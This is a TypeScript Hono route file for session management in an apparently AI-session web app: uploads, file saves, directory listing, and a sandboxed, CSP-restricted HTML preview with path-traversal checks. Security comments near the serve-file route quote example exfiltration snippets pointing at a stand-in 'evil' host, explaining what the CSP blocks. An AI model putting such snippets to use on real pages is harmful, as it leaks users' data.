/*
 * Copyright Maner·Fan
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { getPermissionModesForFlavor, isPermissionModeAllowedForFlavor, toSessionSummary } from '@mobi/shared'
import { EFFORT_LEVELS } from '@mobi/shared/modes'
import { isWithinDir } from '@mobi/shared/pathSecurity'
import { PermissionModeSchema } from '@mobi/shared/schemas'
import { MAX_UPLOAD_BYTES } from '@mobi/shared/upload'
import { streamUpload, concatBytes } from '../utils/uploadStream'
import { safeDecodeHeader } from '../utils/headers'
import { Hono } from 'hono'
import { resolve } from 'node:path'
import { z } from 'zod'
import type { SyncEngine, Session } from '../../sync/syncEngine'
import type { WebAppEnv } from '../middleware/auth'
import { requireSessionFromParam, requireSyncEngine } from './guards'
import { serveFileContent } from './serveFileContent'

const permissionModeSchema = z.object({
    mode: PermissionModeSchema
})

/**
 * HTML 预览 iframe 的 Content-Security-Policy。
 * 见 serve-file 路由注释——配合 iframe sandbox（allow-scripts allow-same-origin）使用：
 * 保留 same-origin 让子资源不被 ORB 拦截，用 CSP 把脚本能力面收窄到「只加载资源、不联网」。
 */
const PREVIEW_CSP = [
    "default-src 'none'",
    "script-src 'self' https: 'unsafe-inline'",
    "style-src 'self' https: 'unsafe-inline'",
    "img-src 'self' data:",
    "font-src 'self' https: data:",
    "media-src 'self' data:",
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    "frame-ancestors 'self'",
    "object-src 'none'",
    "frame-src 'none'",
].join('; ')

const modelSchema = z.object({
    model: z.string().nullable()
})

/** PATCH /sessions/:id 通用 body：重命名与归入项目共用一个端点，至少携带一项 */
const patchSessionSchema = z.object({
    name: z.string().min(1).max(255).optional(),
    /** 归属项目（null = 移回「最近」）；缺省 = 不动归属 */
    projectId: z.string().nullable().optional()
})

const uploadDeleteSchema = z.object({
    path: z.string().min(1)
})

export function createSessionsRoutes(getSyncEngine: () => SyncEngine | null): Hono<WebAppEnv> {
    const app = new Hono<WebAppEnv>()

    app.get('/sessions', (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const getPendingCount = (s: Session) => s.agentState?.requests ? Object.keys(s.agentState.requests).length : 0

        const namespace = c.get('namespace')
        const sessions = engine.getSessionsByNamespace(namespace)
            .sort((a, b) => {
                // Active sessions first
                if (a.active !== b.active) {
                    return a.active ? -1 : 1
                }
                // Within active sessions, sort by pending requests count
                const aPending = getPendingCount(a)
                const bPending = getPendingCount(b)
                if (a.active && aPending !== bPending) {
                    return bPending - aPending
                }
                // Then by updatedAt
                return b.updatedAt - a.updatedAt
            })
            .map(toSessionSummary)

        return c.json({ sessions })
    })

    app.get('/sessions/:id', (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        return c.json({ session: sessionResult.session })
    })

    app.post('/sessions/:id/resume', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const namespace = c.get('namespace')
        const result = await engine.resumeSession(sessionResult.sessionId, namespace)
        if (result.type === 'error') {
            const status: 200 | 401 | 403 | 404 | 500 | 503 =
                result.code === 'no_machine_online' ? 503
                    : result.code === 'access_denied' ? 403
                        : result.code === 'session_not_found' ? 404
                            : 500
            return c.json({ error: result.message, code: result.code }, status)
        }

        return c.json({ type: 'success', sessionId: result.sessionId })
    })

    app.post('/sessions/:id/upload', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const sessionId = sessionResult.sessionId

        // 元信息走 header（body 纯二进制流，非 multipart）：filename + Content-Length
        const filename = safeDecodeHeader(c.req.header('X-Mobi-Filename'))
        const totalSize = Number(c.req.header('Content-Length') ?? 0)
        if (!filename) {
            return c.json({ success: false, error: 'Filename required (X-Mobi-Filename header)' }, 400)
        }
        if (!Number.isFinite(totalSize) || totalSize <= 0) {
            return c.json({ success: false, error: 'Invalid Content-Length' }, 400)
        }
        // 第一道闸：hub 预校验总大小，超限直接 413 不开始传（省带宽）
        if (totalSize > MAX_UPLOAD_BYTES) {
            return c.json({ success: false, error: 'File too large (max 50MB)' }, 413)
        }

        const reader = c.req.raw.body?.getReader()
        if (!reader) {
            return c.json({ success: false, error: 'No request body' }, 400)
        }

        try {
            const path = await streamUpload(
                reader,
                filename,
                totalSize,
                (fn, p, off, chunk) => engine.uploadFileRange(sessionId, fn, p, off, chunk, totalSize),
                (p) => engine.deleteUploadFile(sessionId, p),
            )
            return c.json({ success: true, path })
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to upload file'
            }, 500)
        }
    })

    // save-file：inspector 编辑后保存回原文件（覆盖已存在 + etag OCC）。
    // body 为 octet-stream；path/baseEtag 走 header；一次性聚合（编辑文件 <1MB，不分片）。
    app.post('/sessions/:id/save-file', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) return engine

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) return sessionResult

        const path = safeDecodeHeader(c.req.header('X-Mobi-Path'))
        const baseEtag = c.req.header('X-Mobi-Base-Etag') ?? ''
        if (!path) {
            return c.json({ success: false, error: 'Path required (X-Mobi-Path header)' }, 400)
        }

        // 第一道闸：Content-Length 预校验（对称 upload 路由），超限直接 413 不读 body，省带宽
        const totalSize = Number(c.req.header('Content-Length') ?? 0)
        if (!Number.isFinite(totalSize) || totalSize < 0) {
            return c.json({ success: false, error: 'Invalid Content-Length' }, 400)
        }
        if (totalSize > MAX_UPLOAD_BYTES) {
            return c.json({ success: false, error: 'File too large (max 50MB)' }, 413)
        }

        const reader = c.req.raw.body?.getReader()
        if (!reader) {
            return c.json({ success: false, error: 'No request body' }, 400)
        }

        // 第二道闸：累积字节校验（防 Content-Length 缺失/伪造绕过预校验），超限中途 413，
        // 避免无界缓冲耗尽内存（旧逻辑把整个 body 无限制 push 到 parts[] 再 concatBytes）
        const parts: Uint8Array[] = []
        let received = 0
        for (;;) {
            const { done, value } = await reader.read()
            if (done) break
            if (value) {
                received += value.byteLength
                if (received > MAX_UPLOAD_BYTES) {
                    return c.json({ success: false, error: 'File too large (max 50MB)' }, 413)
                }
                parts.push(value)
            }
        }
        const content = concatBytes(parts)

        try {
            const res = await engine.saveFile(sessionResult.sessionId, path, content, baseEtag)
            if (!res.success && (res as { conflict?: boolean }).conflict) {
                return c.json(res, 409)
            }
            if (!res.success) {
                return c.json(res, 500)
            }
            return c.json(res, 200)
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to save file',
            }, 500)
        }
    })

    app.post('/sessions/:id/upload/delete', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const parsed = uploadDeleteSchema.safeParse(body)
        if (!parsed.success) {
            return c.json({ error: 'Invalid body' }, 400)
        }

        try {
            const result = await engine.deleteUploadFile(sessionResult.sessionId, parsed.data.path)
            if (!result.success) {
                return c.json(result, 400)
            }
            return c.json(result)
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to delete upload'
            }, 500)
        }
    })

    app.post('/sessions/:id/abort', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        await engine.abortSession(sessionResult.sessionId)
        return c.json({ ok: true })
    })

    // 停止后台任务
    app.post('/sessions/:id/stop-task', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) return engine

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) return sessionResult

        const body = await c.req.json().catch(() => ({}))
        const taskId = z.string().parse(body?.taskId)

        await engine.stopTask(sessionResult.sessionId, taskId)
        return c.json({ ok: true })
    })

    app.post('/sessions/:id/archive', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        await engine.archiveSession(sessionResult.sessionId)
        return c.json({ ok: true })
    })

    app.post('/sessions/:id/switch', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        await engine.switchSession(sessionResult.sessionId, 'remote')
        return c.json({ ok: true })
    })

    app.post('/sessions/:id/permission-mode', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const parsed = permissionModeSchema.safeParse(body)
        if (!parsed.success) {
            return c.json({ error: 'Invalid body' }, 400)
        }

        const flavor = sessionResult.session.metadata?.flavor ?? 'claude'
        const mode = parsed.data.mode

        const allowedModes = getPermissionModesForFlavor(flavor)
        if (allowedModes.length === 0) {
            return c.json({ error: 'Permission mode not supported for session flavor' }, 400)
        }

        if (!isPermissionModeAllowedForFlavor(mode, flavor)) {
            return c.json({ error: 'Invalid permission mode for session flavor' }, 400)
        }

        try {
            await engine.applySessionConfig(sessionResult.sessionId, { permissionMode: mode })
            return c.json({ ok: true })
        } catch (error) {
            const message = error instanceof Error ? error.message : 'Failed to apply permission mode'
            return c.json({ error: message }, 409)
        }
    })

    app.post('/sessions/:id/model', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const parsed = modelSchema.safeParse(body)
        if (!parsed.success) {
            return c.json({ error: 'Invalid body' }, 400)
        }

        try {
            await engine.applySessionConfig(sessionResult.sessionId, { model: parsed.data.model })
            return c.json({ ok: true })
        } catch (error) {
            const message = error instanceof Error ? error.message : 'Failed to apply model'
            return c.json({ error: message }, 409)
        }
    })

    const effortSchema = z.object({
        effort: z.enum(EFFORT_LEVELS)
    })

    app.post('/sessions/:id/effort', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine, { requireActive: true })
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const parsed = effortSchema.safeParse(body)
        if (!parsed.success) {
            return c.json({ error: 'Invalid body' }, 400)
        }

        try {
            await engine.applySessionConfig(sessionResult.sessionId, { effort: parsed.data.effort })
            return c.json({ ok: true })
        } catch (error) {
            const message = error instanceof Error ? error.message : 'Failed to apply effort'
            return c.json({ error: message }, 409)
        }
    })

    // 清除 session runtimeState 中的指定字段
    app.patch('/sessions/:id/runtime-state', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const validFields = ['todos', 'tasks', 'backgroundTasks', 'teamState', 'goalStatus']
        const schema = z.object({
            clearFields: z.array(z.enum(validFields as [string, ...string[]])).min(1),
        })
        const parsed = schema.safeParse(body)
        if (!parsed.success) {
            return c.json({ error: 'Invalid body: clearFields must be a non-empty array of valid field names (todos, tasks, backgroundTasks, teamState, goalStatus)' }, 400)
        }

        const namespace = c.get('namespace')
        const cleared = engine.clearRuntimeStateFields(
            sessionResult.sessionId,
            parsed.data.clearFields,
            namespace
        )

        return c.json({ ok: cleared })
    })

    // PATCH /sessions/:id：重命名（{name}）与归入项目（{projectId: string|null}）共用端点，至少携带一项。
    // 注意非原子：projectId 先应用，rename 失败（如版本冲突 409）时归属已变更，不回滚。
    app.patch('/sessions/:id', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const body = await c.req.json().catch(() => null)
        const parsed = patchSessionSchema.safeParse(body)
        if (!parsed.success || (parsed.data.name === undefined && parsed.data.projectId === undefined)) {
            return c.json({ error: 'Invalid body: name or projectId is required' }, 400)
        }

        // 归入项目 / 移回「最近」；目标项目必须与会话同 machine（机器未知的老数据放行）
        if (parsed.data.projectId !== undefined) {
            const namespace = c.get('namespace')
            if (parsed.data.projectId !== null) {
                const project = engine.getProject(parsed.data.projectId)
                if (!project || project.namespace !== namespace) {
                    return c.json({ error: 'Project not found' }, 404)
                }
                // 会话机器未知（老数据无 machineId）时放行；已知则必须匹配
                const sessionMachineId = sessionResult.session.metadata?.machineId
                if (sessionMachineId && project.machineId !== sessionMachineId) {
                    return c.json({ error: 'Project belongs to a different machine' }, 400)
                }
            }
            const ok = engine.setSessionProject(sessionResult.sessionId, parsed.data.projectId, namespace)
            if (!ok) {
                return c.json({ error: 'Session not found' }, 404)
            }
        }

        if (parsed.data.name !== undefined) {
            try {
                await engine.renameSession(sessionResult.sessionId, parsed.data.name)
            } catch (error) {
                const message = error instanceof Error ? error.message : 'Failed to rename session'
                // Map concurrency/version errors to 409 conflict
                if (message.includes('concurrently') || message.includes('version')) {
                    return c.json({ error: message }, 409)
                }
                return c.json({ error: message }, 500)
            }
        }

        return c.json({ ok: true })
    })

    app.delete('/sessions/:id', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        if (sessionResult.session.active) {
            return c.json({ error: 'Cannot delete active session. Archive it first.' }, 409)
        }

        try {
            await engine.deleteSession(sessionResult.sessionId)
            return c.json({ ok: true })
        } catch (error) {
            const message = error instanceof Error ? error.message : 'Failed to delete session'
            // Map "active session" error to 409 conflict (race condition: session became active)
            if (message.includes('active')) {
                return c.json({ error: message }, 409)
            }
            return c.json({ error: message }, 500)
        }
    })

    app.get('/sessions/:id/search-files', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const query = c.req.query('query') ?? ''
        if (!query) {
            return c.json({ success: false, error: 'Query parameter is required' }, 400)
        }
        const type = c.req.query('type') as 'file' | 'directory' | undefined

        try {
            const result = await engine.searchSessionFiles(sessionResult.sessionId, query, type)
            return c.json(result)
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to search files'
            }, 500)
        }
    })

    app.get('/sessions/:id/list-directory', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const path = c.req.query('path') ?? ''
        if (!path) {
            return c.json({ success: false, error: 'Path parameter is required' }, 400)
        }

        // 可选 prefix：大目录下收窄候选集，避免匹配项被 MAX_RESULTS 截断
        const prefix = c.req.query('prefix') ?? undefined

        try {
            const result = await engine.listSessionDirectory(sessionResult.sessionId, path, prefix)
            return c.json(result)
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to list directory'
            }, 500)
        }
    })

    app.get('/sessions/:id/read-file', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const path = c.req.query('path') ?? ''
        if (!path) {
            return c.json({ success: false, error: 'Path parameter is required' }, 400)
        }
        const download = c.req.query('download') === '1'

        // 共享文件服务逻辑（meta/304/Range/stream）抽至 serveFileContent，
        // 与 serve-file（HTML 预览静态资源）复用。
        return serveFileContent(c, engine, sessionResult.sessionId, path, { download })
    })

    // 静态资源服务（HTML 预览用）：相对 cwd 的 path 段形式（splat），相对路径基准交给浏览器原生解析。
    // 安全边界=严格 cwd 内（与 read-file 的 homeDir 边界不同），nosniff 防 MIME 嗅探。
    // download=1 强制 attachment——供「下载」入口，避免 HTML 在 top-level 打开时脱离 sandbox 同源执行。
    // 与 read-file 共享 serveFileContent 的 meta/304/Range/stream 逻辑，仅 path 来源与安全策略不同。
    app.get('/sessions/:id/serve-file/:path{.*}', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        // :path{.*} 捕获 serve-file/ 之后的剩余路径（含子目录），相对路径基准交给浏览器原生解析
        const relPath = c.req.param('path') ?? ''
        if (!relPath) {
            return c.json({ success: false, error: 'Path parameter is required' }, 400)
        }

        const cwd = sessionResult.session.metadata?.path
        if (!cwd) {
            return c.json({ success: false, error: 'Session working directory unknown' }, 500)
        }

        // resolve 已规范化 ..（含 ../etc 形式），越界（逃出 cwd）直接 403
        const absPath = resolve(cwd, relPath)
        if (!isWithinDir(absPath, cwd)) {
            return c.json({ success: false, error: 'Access denied: path outside project directory' }, 403)
        }

        // download=1：top-level 打开会脱离 sandbox（同源执行），强制 attachment 触发下载而非渲染
        const download = c.req.query('download') === '1'
        return serveFileContent(c, engine, sessionResult.sessionId, absPath, {
            download,
            extraHeaders: { 'x-content-type-options': 'nosniff' },
            // HTML 预览文档走 sandbox iframe。iframe 保留 allow-same-origin 是为了让同目录/子目录的
            // CSS/JS 子资源不被 Chrome ORB 拦截（sandboxed opaque origin 的跨源 no-cors 子资源会被丢弃），
            // 但这也让预览的脚本获得 mobi origin 能力。CSP 把这层能力重新收窄：
            //   - script/style/font 'self' + https:  → 支持同目录文件（'self'=serve-file）与外部 CDN（https:），
            //     满足「本地 js/css + CDN 图标库」需求；'unsafe-inline' 兼容行内 <script>/<style>
            //   - img/media 'self' + data:           → 禁外链图片，堵 `<img src=https://evil/?data>` GET 外带
            //   - connect-src 'none'                  → 禁所有 fetch/XHR/sendBeacon/WebSocket，
            //     脚本无法以用户身份（httpOnly cookie）调 mobi API，也无法把数据 POST 到外部
            //   - form-action 'none' / base-uri 'none' / object-src 'none' / frame-src 'none'
            // 残留面：动态createElement('script').src='https://evil/?data' 这类「把数据拼进资源 URL」的
            // 外带仍可绕过（凡允许外链资源加载即无法根治）；但 mobi 凭证走 httpOnly cookie、localStorage
            // 不放 token，外带仅限 recent-paths/偏好等低价值 PII。相较原先「脚本可任意调 mobi API」大幅收敛。
            htmlCsp: PREVIEW_CSP,
        })
    })

    // 文件元信息（mime/size/etag），轻量 stat 不下载内容——供 web 大小判断/协商缓存先行
    app.get('/sessions/:id/file-meta', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        const path = c.req.query('path') ?? ''
        if (!path) {
            return c.json({ success: false, error: 'Path parameter is required' }, 400)
        }

        try {
            const meta = await engine.readFileMeta(sessionResult.sessionId, path)
            if (!meta.success) {
                return c.json({ success: false, error: meta.error ?? 'Failed to read file meta' }, 500)
            }
            return c.json({ success: true, meta: meta.meta })
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to read file meta',
            }, 500)
        }
    })

    app.get('/sessions/:id/metadata', async (c) => {
        const engine = requireSyncEngine(c, getSyncEngine)
        if (engine instanceof Response) {
            return engine
        }

        // Session must exist but doesn't need to be active
        const sessionResult = requireSessionFromParam(c, engine)
        if (sessionResult instanceof Response) {
            return sessionResult
        }

        // SWR（stale-while-revalidate）：
        // - 有缓存：立即返回（web 不阻塞），同时后台异步刷新。刷新仅在内容变化时写库 + 发 SSE，
        //   web 收到 sdk-metadata-refreshed 自动 refetch 拿到新值。会话不活跃时 RPC 静默失败，web 继续用缓存。
        // - 无缓存：阻塞刷新一次（首次打开必须等），写库后返回。
        //   这样 new/resume/reconnect 三种「打开」都能在会话存活时拿到最新 commands/agents/models，
        //   不再因「DB 非空即短路」永久返回陈旧缓存（旧会话看不到新增的 .claude/commands）。
        const sdkMetadata = sessionResult.session.metadata?.sdkMetadata
        if (sdkMetadata && Object.keys(sdkMetadata).length > 0) {
            void engine.refreshSDKMetadataBackground(sessionResult.sessionId)
            return c.json({ success: true, metadata: sdkMetadata })
        }

        // 无缓存：RPC 让 CLI 通过 SDK 提取完整 metadata（阻塞）
        try {
            const result = await engine.refreshMetadata(sessionResult.sessionId)

            // 存入完整 metadata，后续所有字段都可直接从 DB 读取
            if (result.success && result.metadata) {
                engine.updateSDKMetadata(sessionResult.sessionId, result.metadata)
            }

            return c.json({ success: true, metadata: result.metadata ?? {} })
        } catch (error) {
            return c.json({
                success: false,
                error: error instanceof Error ? error.message : 'Failed to get metadata'
            })
        }
    })

    return app
}
